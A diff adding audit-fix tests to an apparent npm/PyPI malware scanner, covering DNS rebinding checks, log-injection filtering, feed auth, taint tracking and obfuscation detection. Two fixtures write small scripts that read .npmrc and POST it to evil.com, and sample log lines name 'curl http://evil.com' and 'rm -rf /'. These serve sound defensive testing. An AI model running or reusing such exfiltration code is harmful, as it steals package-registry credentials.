@@ -661,6 +661,622 @@ async function runCritical18Tests() {
 }
 
 // ===================================================================
+// HIGH #3: Benign set biaisé — native addon packages in packages-npm.txt
+// ===================================================================
+async function runHighFix3Tests() {
+  console.log('\n=== HIGH #3: Benign set native addon packages ===\n');
+
+  test('H3: packages-npm.txt contains native addon packages', () => {
+    const npmList = fs.readFileSync(
+      path.join(__dirname, '../../datasets/benign/packages-npm.txt'), 'utf8'
+    );
+    const lines = npmList.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+    const nativeAddons = ['leveldown', 'sodium-native', 'cpu-features'];
+    for (const pkg of nativeAddons) {
+      assert(lines.includes(pkg), `packages-npm.txt should contain ${pkg}`);
+    }
+  });
+
+  test('H3: packages-npm.txt has at least 3 native addon packages', () => {
+    const npmList = fs.readFileSync(
+      path.join(__dirname, '../../datasets/benign/packages-npm.txt'), 'utf8'
+    );
+    const knownNative = ['bcrypt', 'canvas', 'sqlite3', 'better-sqlite3', 'leveldown',
+      'sodium-native', 'cpu-features', 'sharp', 'node-gyp'];
+    const lines = npmList.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+    const found = knownNative.filter(p => lines.includes(p));
+    assert(found.length >= 3, `Should have at least 3 native addon packages, found ${found.length}: ${found.join(', ')}`);
+  });
+}
+
+// ===================================================================
+// HIGH #4: PyPI evaluation (0 tests PyPI)
+// ===================================================================
+async function runHighFix4Tests() {
+  console.log('\n=== HIGH #4: PyPI evaluation support ===\n');
+
+  test('H4: packages-pypi.txt exists and contains packages', () => {
+    const pypiPath = path.join(__dirname, '../../datasets/benign/packages-pypi.txt');
+    assert(fs.existsSync(pypiPath), 'packages-pypi.txt should exist');
+    const content = fs.readFileSync(pypiPath, 'utf8');
+    const lines = content.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+    assert(lines.length >= 10, `Should have at least 10 PyPI packages, got ${lines.length}`);
+  });
+
+  test('H4: evaluate.js exports evaluateBenignPyPI', () => {
+    const { evaluateBenignPyPI } = require('../../src/commands/evaluate.js');
+    assert(typeof evaluateBenignPyPI === 'function', 'Should export evaluateBenignPyPI function');
+  });
+}
+
+// ===================================================================
+// HIGH #7: DNS rebinding protection
+// ===================================================================
+async function runHighFix7Tests() {
+  console.log('\n=== HIGH #7: DNS rebinding protection ===\n');
+
+  test('H7: isPrivateIP blocks 127.0.0.1', () => {
+    const { isPrivateIP } = require('../../src/shared/download.js');
+    assert(isPrivateIP('127.0.0.1') === true, 'Should block 127.0.0.1');
+  });
+
+  test('H7: isPrivateIP blocks 10.0.0.1', () => {
+    const { isPrivateIP } = require('../../src/shared/download.js');
+    assert(isPrivateIP('10.0.0.1') === true, 'Should block 10.0.0.1');
+  });
+
+  test('H7: isPrivateIP blocks 192.168.1.1', () => {
+    const { isPrivateIP } = require('../../src/shared/download.js');
+    assert(isPrivateIP('192.168.1.1') === true, 'Should block 192.168.1.1');
+  });
+
+  test('H7: isPrivateIP allows public IPs', () => {
+    const { isPrivateIP } = require('../../src/shared/download.js');
+    assert(isPrivateIP('8.8.8.8') === false, 'Should allow 8.8.8.8');
+    assert(isPrivateIP('104.16.0.1') === false, 'Should allow 104.16.0.1');
+  });
+
+  test('H7: safeDnsResolve exported', () => {
+    const { safeDnsResolve } = require('../../src/shared/download.js');
+    assert(typeof safeDnsResolve === 'function', 'Should export safeDnsResolve');
+  });
+
+  await asyncTest('H7: safeDnsResolve rejects private IP literals', async () => {
+    const { safeDnsResolve } = require('../../src/shared/download.js');
+    let threw = false;
+    try {
+      await safeDnsResolve('127.0.0.1');
+    } catch (e) {
+      threw = true;
+      assert(e.message.includes('rebinding') || e.message.includes('private'),
+        'Error should mention rebinding or private');
+    }
+    assert(threw, 'Should throw for private IP literal');
+  });
+
+  await asyncTest('H7: safeDnsResolve rejects 10.x IP literals', async () => {
+    const { safeDnsResolve } = require('../../src/shared/download.js');
+    let threw = false;
+    try {
+      await safeDnsResolve('10.0.0.1');
+    } catch (e) {
+      threw = true;
+    }
+    assert(threw, 'Should throw for 10.0.0.1 IP literal');
+  });
+}
+
+// ===================================================================
+// HIGH #11: Worker threads preload injection
+// ===================================================================
+async function runHighFix11Tests() {
+  console.log('\n=== HIGH #11: Worker threads preload injection ===\n');
+
+  test('H11: preload.js has worker_threads interception', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
+    assert(src.includes("require('worker_threads')"), 'Should require worker_threads');
+    assert(src.includes('_OrigWorker'), 'Should store original Worker constructor');
+    assert(src.includes('MUADDIB_TIME_OFFSET_MS'), 'Should pass time offset to workers');
+    assert(src.includes('--require'), 'Should add --require preload.js to worker execArgv');
+  });
+
+  test('H11: preload.js logs WORKER category', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
+    assert(src.includes("log('WORKER'"), 'Should log WORKER category when spawning');
+  });
+
+  test('H11: analyzer.js accepts WORKER as valid category', () => {
+    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
+    assert(isValidPreloadLine('[PRELOAD] WORKER: Worker spawned: ./task.js (t+50ms)'),
+      'Should accept WORKER category');
+  });
+}
+
+// ===================================================================
+// HIGH #13: Log injection prevention
+// ===================================================================
+async function runHighFix13Tests() {
+  console.log('\n=== HIGH #13: Log injection prevention ===\n');
+
+  test('H13: preload.js sanitizes newlines in log messages', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
+    assert(src.includes('safeMsg'), 'Should use safeMsg for sanitization');
+    assert(src.includes('safeCat'), 'Should sanitize category too');
+    assert(src.includes('.substring(0, 1000)'), 'Should truncate to 1000 chars');
+  });
+
+  test('H13: analyzer.js validates log line format', () => {
+    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
+    // Valid lines
+    assert(isValidPreloadLine('[PRELOAD] TIMER: setTimeout delay=4000ms (t+10ms)'), 'Should accept TIMER');
+    assert(isValidPreloadLine('[PRELOAD] FS_READ: SENSITIVE /root/.npmrc (t+20ms)'), 'Should accept FS_READ');
+    assert(isValidPreloadLine('[PRELOAD] NETWORK: https.request evil.com (t+30ms)'), 'Should accept NETWORK');
+    assert(isValidPreloadLine('[PRELOAD] EXEC: execSync DANGEROUS curl http://evil.com (t+40ms)'), 'Should accept EXEC');
+    assert(isValidPreloadLine('[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+50ms)'), 'Should accept ENV_ACCESS');
+    assert(isValidPreloadLine('[PRELOAD] NATIVE_ADDON: process.dlopen: /x.node (t+60ms)'), 'Should accept NATIVE_ADDON');
+  });
+
+  test('H13: analyzer.js rejects injected fake log lines', () => {
+    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
+    // Injected lines with invalid categories
+    assert(!isValidPreloadLine('[PRELOAD] FAKE_CAT: injected data'), 'Should reject FAKE_CAT');
+    assert(!isValidPreloadLine('some random text [PRELOAD] EXEC: fake'), 'Should reject non-standard prefix');
+    assert(!isValidPreloadLine(''), 'Should reject empty line');
+    assert(!isValidPreloadLine(null), 'Should reject null');
+  });
+
+  test('H13: analyzer.js ignores injected lines in scoring', () => {
+    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
+    // Simulate log injection: attacker injects a fake EXEC line via newline in a message
+    const log = [
+      '[PRELOAD] INIT: Preload active. TIME_OFFSET=0ms (0.0h). PID=1 (t+0ms)',
+      '[PRELOAD] INJECTED: DANGEROUS curl http://evil.com (t+10ms)', // invalid category
+      'FAKE [PRELOAD] EXEC: DANGEROUS rm -rf / (t+20ms)', // not starting with [PRELOAD]
+    ].join('\n');
+    const result = analyzePreloadLog(log);
+    const execFinding = result.findings.find(f => f.type === 'sandbox_exec_suspicious');
+    assert(!execFinding, 'Should NOT produce exec finding from injected log lines');
+  });
+}
+
+// ===================================================================
+// HIGH #16: Feed auth + rate limiting
+// ===================================================================
+async function runHighFix16Tests() {
+  console.log('\n=== HIGH #16: Feed auth + rate limiting ===\n');
+
+  test('H16: checkAuth allows requests when no token configured', () => {
+    const { checkAuth } = require('../../src/serve.js');
+    const origToken = process.env.MUADDIB_FEED_TOKEN;
+    delete process.env.MUADDIB_FEED_TOKEN;
+    try {
+      const result = checkAuth({ headers: {} });
+      assert(result.ok === true, 'Should allow when no token configured');
+    } finally {
+      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
+    }
+  });
+
+  test('H16: checkAuth rejects missing auth header', () => {
+    const { checkAuth } = require('../../src/serve.js');
+    const origToken = process.env.MUADDIB_FEED_TOKEN;
+    process.env.MUADDIB_FEED_TOKEN = 'test-secret-token';
+    try {
+      const result = checkAuth({ headers: {} });
+      assert(result.ok === false, 'Should reject missing auth header');
+      assert(result.error.includes('Missing'), 'Error should mention missing header');
+    } finally {
+      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
+      else delete process.env.MUADDIB_FEED_TOKEN;
+    }
+  });
+
+  test('H16: checkAuth rejects invalid token', () => {
+    const { checkAuth } = require('../../src/serve.js');
+    const origToken = process.env.MUADDIB_FEED_TOKEN;
+    process.env.MUADDIB_FEED_TOKEN = 'correct-token';
+    try {
+      const result = checkAuth({ headers: { authorization: 'Bearer wrong-token' } });
+      assert(result.ok === false, 'Should reject invalid token');
+    } finally {
+      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
+      else delete process.env.MUADDIB_FEED_TOKEN;
+    }
+  });
+
+  test('H16: checkAuth accepts valid bearer token', () => {
+    const { checkAuth } = require('../../src/serve.js');
+    const origToken = process.env.MUADDIB_FEED_TOKEN;
+    process.env.MUADDIB_FEED_TOKEN = 'my-secret-token';
+    try {
+      const result = checkAuth({ headers: { authorization: 'Bearer my-secret-token' } });
+      assert(result.ok === true, 'Should accept valid bearer token');
+    } finally {
+      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
+      else delete process.env.MUADDIB_FEED_TOKEN;
+    }
+  });
+
+  test('H16: checkRateLimit allows requests under limit', () => {
+    const { checkRateLimit, rateLimitMap } = require('../../src/serve.js');
+    rateLimitMap.clear();
+    const result = checkRateLimit('192.168.1.100');
+    assert(result.ok === true, 'First request should be allowed');
+    assert(typeof result.remaining === 'number', 'Should return remaining count');
+  });
+
+  test('H16: checkRateLimit blocks after exceeding limit', () => {
+    const { checkRateLimit, rateLimitMap, RATE_LIMIT_MAX } = require('../../src/serve.js');
+    rateLimitMap.clear();
+    const testIp = '10.0.0.99';
+    // Exhaust the rate limit
+    for (let i = 0; i < RATE_LIMIT_MAX; i++) {
+      checkRateLimit(testIp);
+    }
+    const result = checkRateLimit(testIp);
+    assert(result.ok === false, 'Should block after exceeding rate limit');
+    assert(result.remaining === 0, 'Remaining should be 0');
+    rateLimitMap.clear();
+  });
+}
+
+// ===================================================================
+// HIGH #17: Temporal detections persistence
+// ===================================================================
+async function runHighFix17Tests() {
+  console.log('\n=== HIGH #17: Temporal detections persistence ===\n');
+
+  test('H17: appendTemporalDetection exported', () => {
+    const { appendTemporalDetection } = require('../../src/monitor.js');
+    assert(typeof appendTemporalDetection === 'function', 'Should export appendTemporalDetection');
+  });
+
+  test('H17: loadTemporalDetections exported', () => {
+    const { loadTemporalDetections } = require('../../src/monitor.js');
+    assert(typeof loadTemporalDetections === 'function', 'Should export loadTemporalDetections');
+  });
+
+  test('H17: appendTemporalDetection persists findings', () => {
+    const { appendTemporalDetection, loadTemporalDetections, TEMPORAL_DETECTIONS_FILE } = require('../../src/monitor.js');
+    // Save original file if it exists
+    let origContent = null;
+    if (fs.existsSync(TEMPORAL_DETECTIONS_FILE)) {
+      origContent = fs.readFileSync(TEMPORAL_DETECTIONS_FILE, 'utf8');
+    }
+    try {
+      // Remove file to start clean
+      try { fs.unlinkSync(TEMPORAL_DETECTIONS_FILE); } catch {}
+      const findings = [
+        { type: 'lifecycle_added_critical', severity: 'CRITICAL', message: 'test finding' }
+      ];
+      appendTemporalDetection('test-pkg', '1.0.0', findings);
+      const loaded = loadTemporalDetections();
+      assert(Array.isArray(loaded), 'Should return array');
+      assert(loaded.length >= 1, 'Should have at least 1 detection');
+      const last = loaded[loaded.length - 1];
+      assert(last.name === 'test-pkg', 'Should store package name');
+      assert(last.version === '1.0.0', 'Should store version');
+      assert(Array.isArray(last.findings), 'Should store findings array');
+    } finally {
+      // Restore original file
+      if (origContent !== null) {
+        fs.writeFileSync(TEMPORAL_DETECTIONS_FILE, origContent);
+      } else {
+        try { fs.unlinkSync(TEMPORAL_DETECTIONS_FILE); } catch {}
+      }
+    }
+  });
+}
+
+// ===================================================================
+// HIGH #22: EventEmitter taint tracking in dataflow
+// ===================================================================
+async function runHighFix22Tests() {
+  console.log('\n=== HIGH #22: EventEmitter taint tracking ===\n');
+
+  await asyncTest('H22: Detects EventEmitter taint flow: emit tainted data to network sink handler', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-h22-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"h22-test","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
+const fs = require('fs');
+const https = require('https');
+const EventEmitter = require('events');
+const emitter = new EventEmitter();
+emitter.on('data', function(payload) {
+  https.request({ hostname: 'evil.com', method: 'POST' }).end(payload);
+});
+const secret = fs.readFileSync('.npmrc', 'utf8');
+emitter.emit('data', secret);
+`);
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' || t.type === 'event_emitter_taint'
+      );
+      assert(threat, 'Should detect EventEmitter taint propagation');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  test('H22: dataflow.js has eventHandlers tracking', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/dataflow.js'), 'utf8');
+    assert(src.includes('eventHandlers'), 'Should track event handlers');
+    assert(src.includes('emitTaintedEvents'), 'Should track tainted emits');
+  });
+}
+
+// ===================================================================
+// HIGH #23: Function parameter taint propagation in dataflow
+// ===================================================================
+async function runHighFix23Tests() {
+  console.log('\n=== HIGH #23: Function parameter taint propagation ===\n');
+
+  await asyncTest('H23: Detects taint propagation through function params', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-h23-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"h23-test","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
+const fs = require('fs');
+const https = require('https');
+function exfiltrate(data) {
+  https.request({ hostname: 'evil.com', method: 'POST' }).end(data);
+}
+const token = fs.readFileSync('.npmrc', 'utf8');
+exfiltrate(token);
+`);
+      const result = await runScanDirect(tmpDir);
+      const threat = result.threats.find(t =>
+        t.type === 'suspicious_dataflow'
+      );
+      assert(threat, 'Should detect taint propagation through function parameters');
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  test('H23: dataflow.js has functionDefs tracking', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/dataflow.js'), 'utf8');
+    assert(src.includes('functionDefs'), 'Should track function definitions');
+  });
+}
+
+// ===================================================================
+// HIGH #24: Module graph 5-hop re-export chain
+// ===================================================================
+async function runHighFix24Tests() {
+  console.log('\n=== HIGH #24: Module graph 5-hop re-export chain ===\n');
+
+  test('H24: module-graph.js uses level < 4 for re-export propagation', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/module-graph.js'), 'utf8');
+    assert(src.includes('level < 4'), 'Should use level < 4 for 5-hop propagation');
+    assert(!src.includes('level < 2;'), 'Should NOT have old level < 2 limit');
+  });
+}
+
+// ===================================================================
+// HIGH #25: Dynamic require concatenation in module-graph
+// ===================================================================
+async function runHighFix25Tests() {
+  console.log('\n=== HIGH #25: Dynamic require string concatenation ===\n');
+
+  test('H25: tryResolveConcatRequire resolves simple string concat', () => {
+    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
+    // Simulate a BinaryExpression node: './a' + '/b'
+    const node = {
+      type: 'BinaryExpression',
+      operator: '+',
+      left: { type: 'Literal', value: './a' },
+      right: { type: 'Literal', value: '/b' }
+    };
+    const result = tryResolveConcatRequire(node);
+    assert(result === './a/b', `Should resolve to './a/b', got '${result}'`);
+  });
+
+  test('H25: tryResolveConcatRequire resolves nested concat', () => {
+    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
+    // './a' + '/' + 'b'  =  BinaryExpression(BinaryExpression('./a', '/'), 'b')
+    const node = {
+      type: 'BinaryExpression',
+      operator: '+',
+      left: {
+        type: 'BinaryExpression',
+        operator: '+',
+        left: { type: 'Literal', value: './a' },
+        right: { type: 'Literal', value: '/' }
+      },
+      right: { type: 'Literal', value: 'b' }
+    };
+    const result = tryResolveConcatRequire(node);
+    assert(result === './a/b', `Should resolve to './a/b', got '${result}'`);
+  });
+
+  test('H25: tryResolveConcatRequire returns null for non-string nodes', () => {
+    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
+    const node = {
+      type: 'BinaryExpression',
+      operator: '+',
+      left: { type: 'Identifier', name: 'x' },
+      right: { type: 'Literal', value: './b' }
+    };
+    const result = tryResolveConcatRequire(node);
+    assert(result === null, 'Should return null for non-literal operands');
+  });
+
+  test('H25: tryResolveConcatRequire has depth limit', () => {
+    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
+    // Build deeply nested node (25 levels, beyond the 20 limit)
+    let node = { type: 'Literal', value: 'a' };
+    for (let i = 0; i < 25; i++) {
+      node = {
+        type: 'BinaryExpression',
+        operator: '+',
+        left: node,
+        right: { type: 'Literal', value: 'b' }
+      };
+    }
+    const result = tryResolveConcatRequire(node);
+    assert(result === null, 'Should return null for deeply nested nodes (depth limit)');
+  });
+}
+
+// ===================================================================
+// HIGH #27: Control flow flattening detection
+// ===================================================================
+async function runHighFix27Tests() {
+  console.log('\n=== HIGH #27: Control flow flattening detection ===\n');
+
+  test('H27: detectControlFlowFlattening detects switch-dispatcher pattern', () => {
+    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
+    const cffCode = `
+function obfuscated() {
+  var state = 0;
+  while (true) {
+    switch (state) {
+      case 0:
+        console.log("step 1");
+        state = 2;
+        break;
+      case 1:
+        console.log("step 3");
+        state = 3;
+        break;
+      case 2:
+        console.log("step 2");
+        state = 1;
+        break;
+      case 3:
+        return;
+    }
+  }
+}`;
+    assert(detectControlFlowFlattening(cffCode) === true, 'Should detect CFF pattern');
+  });
+
+  test('H27: detectControlFlowFlattening rejects normal switch', () => {
+    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
+    const normalCode = `
+var x = getInput();
+switch (x) {
+  case 1: doA(); break;
+  case 2: doB(); break;
+  case 3: doC(); break;
+}`;
+    assert(detectControlFlowFlattening(normalCode) === false, 'Should not flag normal switch');
+  });
+
+  test('H27: detectControlFlowFlattening rejects while-switch with < 3 cases', () => {
+    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
+    const code = `
+var s = 0;
+while (true) {
+  switch (s) {
+    case 0: s = 1; break;
+    case 1: return;
+  }
+}`;
+    assert(detectControlFlowFlattening(code) === false, 'Should not flag < 3 cases');
+  });
+
+  test('H27: detectControlFlowFlattening handles while(1) variant', () => {
+    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
+    const code = `
+function runner() {
+  var _state = 0;
+  while (1) {
+    switch (_state) {
+      case 0: _state = 1; break;
+      case 1: _state = 2; break;
+      case 2: _state = 3; break;
+      case 3: return;
+    }
+  }
+}`;
+    assert(detectControlFlowFlattening(code) === true, 'Should detect while(1) variant');
+  });
+
+  test('H27: detectControlFlowFlattening handles invalid code gracefully', () => {
+    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
+    assert(detectControlFlowFlattening('not valid javascript {{{') === false, 'Should return false for invalid code');
+    assert(detectControlFlowFlattening('') === false, 'Should return false for empty string');
+  });
+}
+
+// ===================================================================
+// HIGH #30: Module graph catch block logging
+// ===================================================================
+async function runHighFix30Tests() {
+  console.log('\n=== HIGH #30: Module graph error logging ===\n');
+
+  test('H30: index.js logs module graph errors with debugLog', () => {
+    const src = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
+    assert(src.includes("debugLog('[MODULE-GRAPH] Error:'"), 'Should log module graph errors via debugLog');
+    assert(!src.includes('catch { }') && !src.includes('catch {}'), 'Should NOT have empty catch block for module graph');
+  });
+}
+
+// ===================================================================
+// HIGH #31: Cross-file scoring bonus
+// ===================================================================
+async function runHighFix31Tests() {
+  console.log('\n=== HIGH #31: Cross-file scoring bonus ===\n');
+
+  test('H31: calculateRiskScore includes crossFileBonus', () => {
+    const { calculateRiskScore } = require('../../src/scoring.js');
+    // Single file: score should equal file score + package score
+    const singleFileThreats = [
+      { type: 'dangerous_exec', severity: 'HIGH', file: 'evil.js', message: 'exec' }
+    ];
+    const result1 = calculateRiskScore(singleFileThreats);
+    assert(result1.crossFileBonus === 0, 'Single file should have 0 crossFileBonus');
+  });
+
+  test('H31: Multi-file threats get cross-file bonus', () => {
+    const { calculateRiskScore } = require('../../src/scoring.js');
+    // 3 files each with 1 HIGH threat (10 points each)
+    const multiFileThreats = [
+      { type: 'dangerous_exec', severity: 'HIGH', file: 'a.js', message: 'exec1' },
+      { type: 'dangerous_exec', severity: 'HIGH', file: 'b.js', message: 'exec2' },
+      { type: 'dangerous_exec', severity: 'HIGH', file: 'c.js', message: 'exec3' }
+    ];
+    const result = calculateRiskScore(multiFileThreats);
+    assert(result.crossFileBonus > 0, `Multi-file should have positive crossFileBonus, got ${result.crossFileBonus}`);
+    // Each non-max file scores 10, 25% = 3 each (ceil), so bonus = 3+3 = 6
+    assert(result.crossFileBonus === 6, `Expected crossFileBonus=6, got ${result.crossFileBonus}`);
+    // Total: maxFile(10) + bonus(6) + package(0) = 16
+    assert(result.riskScore === 16, `Expected riskScore=16, got ${result.riskScore}`);
+  });
+
+  test('H31: Cross-file bonus capped at 25', () => {
+    const { calculateRiskScore } = require('../../src/scoring.js');
+    // 10 files each with 1 CRITICAL threat (25 points each)
+    const manyFileThreats = [];
+    for (let i = 0; i < 10; i++) {
+      manyFileThreats.push({
+        type: 'dangerous_exec', severity: 'CRITICAL', file: `file${i}.js`, message: `exec${i}`
+      });
+    }
+    const result = calculateRiskScore(manyFileThreats);
+    assert(result.crossFileBonus <= 25, `Cross-file bonus should be capped at 25, got ${result.crossFileBonus}`);
+    // 9 non-max files × ceil(25*0.25) = 9×7 = 63, capped at 25
+    assert(result.crossFileBonus === 25, `Expected crossFileBonus=25, got ${result.crossFileBonus}`);
+  });
+
+  test('H31: Package-level threats still add separately', () => {
+    const { calculateRiskScore } = require('../../src/scoring.js');
+    const threats = [
+      { type: 'dangerous_exec', severity: 'HIGH', file: 'evil.js', message: 'exec' },
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'lifecycle' }
+    ];
+    const result = calculateRiskScore(threats);
+    // File score: 10 (1 HIGH). Package score: 3 (1 MEDIUM). No cross-file bonus (1 file only).
+    assert(result.maxFileScore === 10, `Expected maxFileScore=10, got ${result.maxFileScore}`);
+    assert(result.packageScore === 3, `Expected packageScore=3, got ${result.packageScore}`);
+    assert(result.riskScore === 13, `Expected riskScore=13, got ${result.riskScore}`);
+  });
+}
+
+// ===================================================================
 // EXPORT
 // ===================================================================
 async function runAuditFixTests() {
@@ -677,6 +1293,21 @@ async function runAuditFixTests() {
   await runCritical10Tests();
   await runCritical15Tests();
   await runCritical18Tests();
+  // HIGH fixes
+  await runHighFix3Tests();
+  await runHighFix4Tests();
+  await runHighFix7Tests();
+  await runHighFix11Tests();
+  await runHighFix13Tests();
+  await runHighFix16Tests();
+  await runHighFix17Tests();
+  await runHighFix22Tests();
+  await runHighFix23Tests();
+  await runHighFix24Tests();
+  await runHighFix25Tests();
+  await runHighFix27Tests();
+  await runHighFix30Tests();
+  await runHighFix31Tests();
 }
 
 module.exports = { runAuditFixTests };
